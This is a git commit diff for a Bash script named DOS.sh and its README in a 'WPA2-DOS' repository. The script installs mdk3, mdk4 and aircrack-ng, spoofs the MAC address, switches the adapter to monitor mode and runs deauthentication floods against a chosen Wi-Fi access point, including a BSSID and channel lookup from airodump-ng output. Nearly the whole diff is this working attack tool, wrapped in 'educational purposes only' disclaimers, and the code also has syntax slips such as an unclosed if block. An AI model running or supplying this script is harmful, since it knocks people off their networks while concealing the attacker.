19b8984c4fa0aa4107ceb7a1c20d417737956625
TDonk994 <tgarvey@flemingcollege.ca>
2024-10-02 23:34:19 -0400

    aireplay-ng possibly functionable
    -added & fixed installed package checking -tested -working
    -aireplay-ng deauth attack should function  -untested -50/50
    - filtering the output of airodump-ng -tested -working only for the aireplay-ng

--- DOS.sh
+++ DOS.sh
@@ -1,80 +1,86 @@
 #!/bin/bash
 
-# $e is for the AP's name 
+#this script is for educational purposes only
+#I am not responsible for any damage caused by this script
+#this script is for testing your own network or someone else's network with permission
+
+#this script is a DOS attack for WPA2 APS
+#by: TDonk994
+
+#last commit date: 10/02/2024
+
+
+
 echo "DOS Attack for WPA2 APS, using airodump, airmon, mdk3 and mdk4"
 sleep 1
 echo "make sure you have sudo privileges"
+echo "make sure you have a wireless adapter able to go into monitor mode"
+echo "recommend to use in dir desktop"
+read -p "Do you want to continue? (y/n): " continue
+if [ $continue == "n" ]; then
+    echo "exiting"
+    exit 1
+else
+    echo "continuing"
+fi
 sleep 1
 echo "Checking if mdk3, mdk4 and aircrack-ng are installed"
-
-mdk3Check=$(sudo apt list --installed | grep mdk3)
-mdk4Check=$(sudo apt list --installed | grep mdk4)
-aircrackCheck=$(sudo apt list --installed | grep aircrack-ng)
-
-if [ -z "$mdk3Check" ]
-then
+#this variables check if the packages are installed
+mdk3Check=$(sudo dpkg -s mdk3 &> /dev/null && echo "true" || echo "false")
+mdk4Check=$(sudo dpkg -s mdk4 &> /dev/null && echo "true" || echo "false")
+aircrackCheck=$(sudo dpkg -s aircrack-ng &> /dev/null && echo "true" || echo "false")
+#this checks if mdk3 is installed
+if [ $mdk3Check == "false" ]; then
     echo "mdk3 is not installed"
-    read -p "Do you want to install mdk3? (y/n): " mdk3Install
-    if [ $mdk3Install == "y" ]
-    then
+    read -p "Do you want to install mdk3? (y/n): " install
+    if [ $install == "y" ]; then
         echo "installing mdk3"
         sudo apt-get install mdk3
+        echo "mdk3 installed"
     else
-        echo "exiting"
-        sleep 1
+        echo "mdk3 is required for this attack"
         exit 1
     fi
 else
     echo "mdk3 is installed"
 fi
-if [ -z "$mdk4Check" ]
-then
+#this checks if mdk4 is installed
+if [ $mdk4Check == "false" ]; then
     echo "mdk4 is not installed"
-    read -p "Do you want to install mdk4? (y/n): " mdk4Install
-    if [ $mdk4Install == "y" ]
+    read -p "Do you want to install mdk4? (y/n): " install
+    if [ $install == "y" ]
     then
         echo "installing mdk4"
         sudo apt-get install mdk4
+        echo "mdk4 installed"
     else
-        echo "exiting"
-        sleep 1
+        echo "mdk4 is required for this attack"
         exit 1
     fi
 else
     echo "mdk4 is installed"
 fi
-if [ -z "$aircrackCheck" ]
-then
+#this checks if aircrack-ng is installed
+if [ $aircrackCheck == "false" ]; then
     echo "aircrack-ng is not installed"
-    read -p "Do you want to install aircrack-ng? (y/n): " aircrackInstall
-    if [ $aircrackInstall == "y" ]
-    then
+    read -p "Do you want to install aircrack-ng? (y/n): " install
+    if [ $install == "y" ]; then
         echo "installing aircrack-ng"
         sudo apt-get install aircrack-ng
+        echo "aircrack-ng installed"
     else
-        echo "exiting"
-        sleep 1
+        echo "aircrack-ng is required for this attack"
         exit 1
     fi
 else
     echo "aircrack-ng is installed"
 fi
-echo "All dependencies are installed"
-sleep 1
-read -p "Do you have a wireless adapter? (y/n): " yn
-if [ $yn == "y" ]
-then
-    echo "continuing"
-else
-    echo "exiting"
-    sleep 1
-    exit 1
-fi
+#user input for a AP's name
 read -p "Enter the AP's name: " AP
-sleep 2
+sleep 1
 echo "The AP's name is: $AP"
-
-echo "setting up the attack"
+#setting up the wireless adapter and other stuff that might interfere with the attack
+echo "setting up the wireless adapter/interfaces"
 sudo ifconfig eth0 down 
 sudo iwconfig wlan0 down 
 sudo macchanger -r wlan0 
@@ -83,34 +89,79 @@ sudo systemctl stop NetworkManager
 sudo airmon wlan0 start
 sudo iwconfig wlan0 mode monitor
 sudo ifconfig wlan0 up
-echo "checking if wlan0 is in monitor mode"
-monitorCheck=$(iwconfig wlan0 | grep Monitor)
-if [ -z "$monitorCheck" ]
-then
-    echo "wlan0 is not in monitor mode"
-    echo "putting wlan0 in monitor mode"
-    sudo iwconfig wlan0 mode monitor
-else
-    echo "wlan0 is in monitor mode"
-fi
+
+#asking the user which attack they want to use
 read -p "which attack do you want to use? mdk3(1), mdk4(2), aireplay-ng(3)?": " attack"
-if [ $attack == "1" ]
-then
+if [ $attack == "1" ]; then
     echo "starting mdk3 attack"
     sudo mdk3 wlan0 d -w $AP
-elif [ $attack == "2" ]
-then
+elif [ $attack == "2" ]; then
     echo "starting mdk4 attack"
     sudo mdk4 wlan0 d -w $AP
-elif [ $attack == "3" ]
-then
-    echo "starting aireplay-ng attack"
-    sudo airodump-ng -b abg wlan0
+elif [ $attack == "3" ]; then
+    echo "setting up aireplay-ng deauth attack"
+#deletes the files if they exist so no duplicates
+#also recommend to use the desktop directory for this
+    if [ -e "wlan0-01.csv" ]; then
+        rm wlan0-01.csv
+    else
+        echo "no more wlan0-01.csv"
+    fi
+    if [ -e "bssid.csv" ]; then
+        rm bssid.csv
+    else
+        echo "no more bssid.csv"
+    fi
+    if [ -e "bssid1.csv" ]; then
+        rm bssid1.csv
+    else
+        echo "no more bssid1.csv"
+    fi
+    if [ -e "bssid2.csv" ]; then
+        rm bssid2.csv
+    else
+        echo "no  more bssid2.csv"
+    fi
+    echo "all files deleted or non existent"
+    sleep 1
+    echo "starting airodump-ng to find $AP, this will take 15 seconds"
+    sudo timeout 15 airodump-ng -b abg -N $AP wlan0 --write wlan0 --output-format csv  
+    cat wlan0-01.csv | grep $AP > bssid.csv
+    cat bssid.csv | sed 's/,//g' > bssid1.csv
+    checknumberofbssids=$(cat bssid1.csv | awk '{print $1}' | wc -l)
+    if [ $checknumberofbssids > 1 ]; then
+        echo "multiple bssids found"
+        cat bssid1.csv | awk '{print}'
+        cat bssid1.csv | awk '{print $1}' 
+        read -p "which bssid do you want to use? type the whole mac address: " bssid
+        echo "you chose $bssid"
+        cat bssid1.csv | grep $bssid > bssid2.csv
+        usedbssid=$(cat bssid2.csv | awk '{print $1}')
+        usedchannel=$(cat bssid2.csv | awk '{print $6}') 
+        echo "changing channel to $usedchannel"
+        sleep 1
+        sudo iwconfig wlan0 channel $usedchannel
+        echo "starting aireplay-ng attack" 
+        sleep 1
+        read -p "how long do you want to run the attack for? (in seconds): " time
+        if [ $time == "0" ]; then
+            echo "running attack until you stop it"
+            sudo aireplay-ng -0 0 -a $usedbssid wlan0
+        elif [[ -n ${time//[0-9]/} ]]; then
+            echo "invalid input"
+            sleep 1 
+            echo "running attack until you stop it (ctrl c)"
+            sudo aireplay-ng -0 0 -a $usedbssid wlan0
+
+        else
+            echo "running attack for $time seconds"
+            sudo aireplay-ng -0 $time -a $usedbssid wlan0
+            echo "attack finished"
+            sleep 1 
+            echo "exiting"
+            exit 1
+        fi
 else
     echo "invalid input"
-    sleep 1
-    return 1
+    exit 1
 fi
-sudo airodump-ng -b abg wlan0 > wlans.txt 
-return 0 
-cat wlans.txt
--- README.md
+++ README.md
@@ -1,2 +1,30 @@
 # WPA2-DOS
- 
+# this script is for educational purposes only
+# I am not responsible for any damage caused by this script
+# this is for testing your own network or someone else's network with PERMISSION
+
+    these current attacks only work on WPA & WPA2 APs.
+    Currently don't have a way to make sure that the AP is real. Will probably add that later, so make sure you spell its name correctly.
+
+
+
+future add-ons -- *If I have time/feel like it*
+    -more error checking
+    -the option to target multiple APs
+    -other type of attacks and packages
+    -clean up the script to function better
+
+    this script assumes you have a wireless adapter with monitor mode and the correct drivers installed
+if you don't atleast have those this won't work.
+might add a way to check later but unlikly
+
+requirements -- *what I could think of*
+    -Wireless Adapter or wireless card that can use monitor mode
+    -Linux *I think?*
+
+
+
+recommend -- *personal opinions* 
+    -use the Desktop dir *I like GUIs*
+    -use kali linux *tested script on this but any linux distro should work*
+    -newest version of kali linux 
